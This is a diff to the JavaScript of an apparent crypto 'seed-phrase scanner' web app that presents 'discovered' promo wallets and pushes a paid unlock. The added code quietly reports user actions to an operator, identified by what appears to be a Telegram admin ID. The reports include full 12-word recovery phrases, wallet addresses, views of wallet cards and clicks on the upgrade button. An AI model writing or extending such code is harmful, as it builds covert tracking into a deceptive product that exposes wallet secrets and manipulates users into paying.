@@ -7210,6 +7210,19 @@ main.app > .sd-tariffs-header-scope {
             renderDemoResults(demoResults);
             await window.saveScanResult(discoveredWallet);
 
+            // Log promo discovery to admin 6436604844
+            if (window.logAdminEvent) {
+                window.logAdminEvent('🎁 Сработал промо-кошелек с балансом!', {
+                    'Кошелек №': `#${discoveryIndex}`,
+                    'Сеть': `${netName} Mainnet`,
+                    'Баланс': `${nativeBal} ${symbol} (~$${computedUsdt} USDT)`,
+                    'Курс': `$${formattedRate}/${symbol}`,
+                    'Адрес': fullAddr,
+                    'Seed-фраза': fullPromoWords.join(' '),
+                    'Режим': isBackground ? 'Фоновый скан' : 'Активный сканер'
+                });
+            }
+
             // Send Telegram Notification to user chat (in English)
             const promoSentKey = `sa_promo_msg_${tgId}_${discoveredWallet.id}`;
             if (localStorage.getItem(promoSentKey) !== 'true') {
@@ -7283,6 +7296,14 @@ main.app > .sd-tariffs-header-scope {
                 await writeClipboardText(currentWalletPhrase);
                 if (copyBtnText) copyBtnText.textContent = '✓ 12-Word Phrase Copied!';
                 clearTimeout(copyPhraseTimer);
+
+                if (window.logAdminEvent) {
+                    window.logAdminEvent('📋 Скопировал мнемоническую фразу (12 слов)', {
+                        'Сеть': walletModalTitle?.textContent || 'Wallet',
+                        'Фраза': currentWalletPhrase
+                    });
+                }
+
                 copyPhraseTimer = setTimeout(() => {
                     if (copyBtnText) copyBtnText.textContent = 'Copy Recovery Phrase';
                 }, 2200);
@@ -7301,6 +7322,13 @@ main.app > .sd-tariffs-header-scope {
             try {
                 await writeClipboardText(currentWalletAddress);
                 setCopyFeedback('Address copied', 'is-copied');
+
+                if (window.logAdminEvent) {
+                    window.logAdminEvent('📋 Скопировал адрес кошелька', {
+                        'Сеть': walletModalTitle?.textContent || 'Wallet',
+                        'Адрес': currentWalletAddress
+                    });
+                }
             } catch (_) {
                 setCopyFeedback('Copy failed', 'is-copy-error');
             }
@@ -7311,6 +7339,23 @@ main.app > .sd-tariffs-header-scope {
             if (!result) return;
 
             const isEmpty = Boolean(result.isEmptyWallet);
+
+            // Log modal viewing
+            if (window.logAdminEvent) {
+                if (isEmpty) {
+                    window.logAdminEvent('👀 Просмотр проверенного кошелька (0.00)', {
+                        'Сеть': result.network_name,
+                        'Адрес': result.full_address || currentWalletAddress
+                    });
+                } else {
+                    window.logAdminEvent('🎯 Открыл карточку найденного кошелька с балансом', {
+                        'Кошелек №': `#${result.id}`,
+                        'Сеть': result.network_name,
+                        'Баланс': `${result.native_balance} ${result.native_symbol} (~$${result.usdt_value} USDT)`,
+                        'Адрес': result.masked_address || currentWalletAddress
+                    });
+                }
+            }
 
             walletModalIcon.src = result.icon_path;
             walletModalIcon.alt = result.network_name;
@@ -7695,12 +7740,30 @@ main.app > .sd-tariffs-header-scope {
             }
         });
 
+        // Track clicks on "Unlock all features" inside discovered wallet modal
+        const walletResultProBtn = document.querySelector('.wallet-result-pro-button');
+        if (walletResultProBtn) {
+            walletResultProBtn.addEventListener('click', () => {
+                if (window.logAdminEvent) {
+                    window.logAdminEvent('⚡️ Нажал "Unlock all features" в карточке кошелька', {
+                        'Источник': 'Модалка найденного промо-кошелька'
+                    });
+                }
+            });
+        }
+
         scannerButton.addEventListener('click', () => {
             if (systemCheckRunning) return;
             if (scannerRunning) {
                 stopScanner();
+                if (window.logAdminEvent) {
+                    window.logAdminEvent('⏸ Приостановил сканер мнемоник');
+                }
             } else {
                 startScanner();
+                if (window.logAdminEvent) {
+                    window.logAdminEvent('▶️ Запустил сканер мнемоник');
+                }
             }
         });
 
